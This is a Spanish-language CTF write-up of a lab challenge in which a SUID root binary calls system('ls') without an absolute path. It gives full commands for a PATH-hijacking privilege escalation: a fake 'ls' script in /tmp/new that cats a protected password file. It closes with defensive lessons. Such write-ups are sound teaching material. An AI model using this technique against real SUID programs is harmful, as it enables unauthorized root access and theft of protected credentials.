Writeup: Bash - System 1 (Challenge 11)
📋 Información del Desafío
Campo	Valor
Nombre	Bash - System 1
Plataforma	Desafío de hacking/CTF
Nivel	11
Puntos	5
Dificultad	15% de éxito
Validaciones	56,325 challengers
Autor	Lu33Y (8 febrero 2012)
📜 Declaración del Problema

Tenemos un binario con el siguiente código fuente:
c

#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}

El objetivo: Obtener el contenido del archivo .passwd para avanzar al siguiente nivel.
🔍 Análisis Inicial
1. Reconocimiento del Entorno
bash

ls
# Output: makefile  ch11  ch11.c

2. Verificación de Permisos
bash

ls -la ch11
# Output: -r-sr-x--- 1 root root 12345 Feb 8 2012 ch11

Análisis de permisos:

    -r-sr-x--- → El binario tiene SUID activado (la 's')

    Propietario: root

    Se ejecuta con privilegios de root

3. Comportamiento del Binario
bash

./ch11
# Output: /challenge/app-script/ch11/.passwd

El binario solo muestra el nombre del archivo, no su contenido.
4. Intento de Lectura Directa
bash

cat /challenge/app-script/ch11/.passwd
# Output: Permission denied ❌

El archivo no es legible para nuestro usuario.
5. Verificación de /etc/passwd
bash

cat /etc/passwd
# Output: (lista de usuarios) ✅

Esto confirma que tenemos ejecución de comandos básica.
🧠 Comprendiendo la Vulnerabilidad
¿Por qué funciona este ataque?

    SUID (Set User ID): El binario se ejecuta como root

    system() sin ruta absoluta: Usa "ls" en lugar de "/bin/ls"

    Variable PATH: El sistema busca comandos en los directorios del PATH

Visualización del Flujo
text

Usuario normal → ./ch11 → SUID activado → Root ejecuta:
                                        ↓
                            system("ls /challenge/.../.passwd")
                                        ↓
                            Busca "ls" en el PATH
                                        ↓
                            Encuentra /bin/ls
                                        ↓
                            Muestra solo el NOMBRE

El Ataque
text

Usuario normal → ./ch11 → SUID activado → Root ejecuta:
                                        ↓
                            system("ls /challenge/.../.passwd")
                                        ↓
                            Busca "ls" en el PATH (modificado)
                                        ↓
                            ¡Encuentra nuestro "ls" falso!
                                        ↓
                            Ejecuta nuestro script → cat .passwd
                                        ↓
                            ¡Muestra el CONTENIDO!

🛠️ Desarrollo de la Solución
Problema 1: No podemos crear /tmp/ls

Intento fallido:
bash

echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/ls
# Output: Permission denied ❌

Solución: Usar un nombre diferente y crear enlaces.
Problema 2: El alias no funciona

Intento fallido:
bash

alias ls='cat /challenge/app-script/ch11/.passwd'
./ch11
# Output: /challenge/app-script/ch11/.passwd ❌ (no funcionó)

Explicación: system() crea un subshell que NO hereda los alias de bash.
Problema 3: Restricciones de escritura
bash

# Verificamos dónde podemos escribir
pwd
ls -la .

💡 Solución Final (Primer Enfoque)
Paso 1: Crear el Script Malicioso
bash

echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/ls-new

¿Qué hace?

    Crea un archivo llamado ls-new en /tmp

    Contiene el comando que queremos ejecutar con privilegios de root

    cat /challenge/app-script/ch11/.passwd → leerá el contenido del archivo

Paso 2: Dar Permisos de Ejecución
bash

chmod +x /tmp/ls-new

Paso 3: Crear Directorio para el Enlace
bash

mkdir /tmp/new

Paso 4: Crear Enlace Simbólico
bash

ln -sf /tmp/ls-new /tmp/new/ls

¿Por qué?

    El binario busca específicamente "ls"

    Creamos un enlace que apunte a nuestro script

    -s → enlace simbólico

    -f → fuerza la sobrescritura si existe

Paso 5: Modificar el PATH
bash

PATH=/tmp/new:$PATH ./ch11

¿Qué hace?

    PATH=/tmp/new:$PATH → Primero busca en /tmp/new

    ./ch11 → Ejecuta el binario con SUID

    El sistema encuentra nuestro "ls" falso

Paso 6: Obtener la Flag
bash

# Output: ********************* ✅

¡Éxito! Hemos obtenido la contraseña.
🚀 Solución Alternativa (Más Elegante)

Lección aprendida: Si no podemos modificar /tmp/ls, ¡creemos nuestro propio directorio!
Enfoque Directo (Recomendado)
bash

# Paso 1: Crear nuestro directorio
mkdir /tmp/new

# Paso 2: Crear el script directamente con el nombre "ls"
echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/new/ls

# Paso 3: Dar permisos de ejecución
chmod +x /tmp/new/ls

# Paso 4: Ejecutar el binario con PATH modificado
PATH=/tmp/new:$PATH ./ch11

¿Por qué es mejor?
Aspecto	Con Enlace	Enfoque Directo
Comandos	5 pasos	4 pasos
Archivos creados	2 (ls-new + enlace)	1 (ls)
Complejidad	Media	Baja
Más limpio	❌	✅
Menos archivos temporales	❌	✅
Visualmente:
text

/tmp/
├── new/              ← Directorio CREADO POR NOSOTROS
│   └── ls            ← Nuestro script (¡lo creamos directamente!)
├── ls-new            ← Nuestro script original (ya no es necesario)
└── ls                ← Archivo existente (no podemos modificarlo)

Con el enfoque directo, ni siquiera necesitamos crear ls-new. Creamos el ls directamente en nuestro propio directorio.
📊 Diagrama de la Solución (Enfoque Directo)
text

┌─────────────────────────────────────────────────────────────┐
│              1. CREAMOS NUESTRO DIRECTORIO                  │
│                                                             │
│  mkdir /tmp/new                                             │
│  (Tenemos control total sobre este directorio)              │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                2. CREAMOS NUESTRO "ls" FALSO                │
│                                                             │
│  echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/new/ls│
│  chmod +x /tmp/new/ls                                       │
│                                                             │
│  /tmp/new/                                                  │
│  └── ls  (nuestro script, directamente)                     │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                   3. EJECUTAMOS EL BINARIO                  │
│                                                             │
│  PATH=/tmp/new:$PATH ./ch11                                 │
│                                                             │
│  ./ch11 (SUID root)                                         │
│      ↓                                                      │
│  system("ls /challenge/.../.passwd")                        │
│      ↓                                                      │
│  Busca "ls" en PATH → /tmp/new/ls (nuestro)                │
│      ↓                                                      │
│  Ejecuta nuestro script como root                           │
│      ↓                                                      │
│  cat /challenge/app-script/ch11/.passwd                    │
│      ↓                                                      │
│  *********************  ✅                                          │
└─────────────────────────────────────────────────────────────┘

🐛 Problemas Encontrados y Soluciones
Problema	Intento	Resultado	Solución Final
No puedo crear /tmp/ls	echo > /tmp/ls	❌ Permission denied	Usar /tmp/ls-new
Alias no funciona	alias ls='...'	❌ No heredado por subshell	Usar script en PATH
Necesito que se llame "ls"	Intentar crear directamente	❌ Sin permisos	Crear nuestro propio directorio
/tmp no permite escritura	Varios intentos	❌ Restringido	Usar directorio propio /tmp/new
PATH no se actualiza	export PATH	⚠️ No persistente	PATH=/tmp/new:$PATH ./ch11
🔧 Comandos Clave Explicados
mkdir /tmp/new

Crea nuestro propio directorio donde tenemos control total.
echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/new/ls

Creamos nuestro script directamente con el nombre "ls". ¡No necesitamos enlaces!
chmod +x /tmp/new/ls

Damos permisos de ejecución al script.
PATH=/tmp/new:$PATH ./ch11

    Modifica PATH solo para esta ejecución

    /tmp/new se busca primero

    El binario encuentra nuestro "ls" y lo ejecuta con privilegios de root

🎯 Flag Obtenida
text

*********************

📚 Conceptos Aprendidos
1. SUID (Set User ID)

    Permite que un binario se ejecute con permisos del propietario

    Riesgo de seguridad si no se usa correctamente

    En este caso, nos permite escalar privilegios

2. Variable PATH

    Determina dónde busca el sistema los ejecutables

    Podemos manipularla para redirigir comandos

    Crítico para este tipo de ataques

3. Enlaces Simbólicos

    Crean "alias" de archivos

    Permiten que un archivo tenga múltiples nombres

    Útil para bypass de restricciones de nombres

4. Inyección de Comandos

    Hacer que un programa ejecute comandos no previstos

    Aprovechar system() sin sanitización

    Escalada de privilegios mediante SUID

5. Subshells y Variables

    system() crea un subshell /bin/sh

    Los alias de bash NO se heredan

    Las variables de entorno SÍ se heredan (PATH)

6. Crear tu propio espacio

    Cuando encuentres una restricción, crea tu propio directorio

    En lugar de luchar contra archivos existentes, crea los tuyos

    Simplifica: ¿Necesitas "ls"? Créalo directamente en tu directorio

💡 Lecciones Aprendidas
Lección 1: No te rindas ante las restricciones

    /tmp/ls no se puede modificar → creamos /tmp/ls-new

    Necesitamos que se llame "ls" → creamos nuestro directorio /tmp/new

Lección 2: El camino más corto suele ser el mejor
bash

# ❌ Complejo (con enlace)
echo 'cat ...' > /tmp/ls-new
chmod +x /tmp/ls-new
mkdir /tmp/new
ln -sf /tmp/ls-new /tmp/new/ls
PATH=/tmp/new:$PATH ./ch11

# ✅ Simple (directo)
mkdir /tmp/new
echo 'cat ...' > /tmp/new/ls
chmod +x /tmp/new/ls
PATH=/tmp/new:$PATH ./ch11

Lección 3: Crea tu propio espacio

"Cuando encuentres una restricción, crea tu propio espacio donde tengas control total."
📝 Resumen Técnico

Vulnerabilidad: El binario con SUID ejecuta system("ls ...") sin ruta absoluta, confiando en la variable PATH.

Vector de ataque (versión simplificada):

    Crear nuestro propio directorio (/tmp/new)

    Crear nuestro script "ls" dentro de él

    Modificar PATH para priorizar nuestro directorio

    Ejecutar el binario con SUID

Resultado: El binario ejecuta nuestro script con permisos de root, mostrando el contenido del archivo restringido.
🏆 Conclusión

Este desafío demuestra la importancia de:

    ✅ Usar rutas absolutas en system()

    ✅ Sanitizar comandos ejecutados

    ✅ Manejar correctamente los permisos SUID

    ✅ Entender cómo funciona la variable PATH

    ✅ Buscar soluciones simples y elegantes

    ✅ Crear tu propio espacio cuando encuentres restricciones

¡Desafío completado con éxito!
📎 Anexo: Comandos Utilizados
Enfoque con Enlace (Primera Solución)
bash

echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/ls-new
chmod +x /tmp/ls-new
mkdir /tmp/new
ln -sf /tmp/ls-new /tmp/new/ls
PATH=/tmp/new:$PATH ./ch11

Enfoque Directo (Solución Optimizada)
bash

mkdir /tmp/new
echo 'cat /challenge/app-script/ch11/.passwd' > /tmp/new/ls
chmod +x /tmp/new/ls
PATH=/tmp/new:$PATH ./ch11

Limpieza del Sistema
bash

# Eliminar archivos temporales
rm -rf /tmp/new
rm -f /tmp/ls-new

# Verificar que no queda rastro
ls -la /tmp/ | grep -E "ls-new|new"

Flag obtenida: *********************
📈 Comparativa de Enfoques
Aspecto	Enfoque con Enlace	Enfoque Directo
Número de pasos	5	4
Archivos creados	2	1
Comandos	Más complejos	Más simples
Mantenimiento	Menos limpio	Más limpio
Facilidad de comprensión	Media	Alta
Recomendado	❌	✅
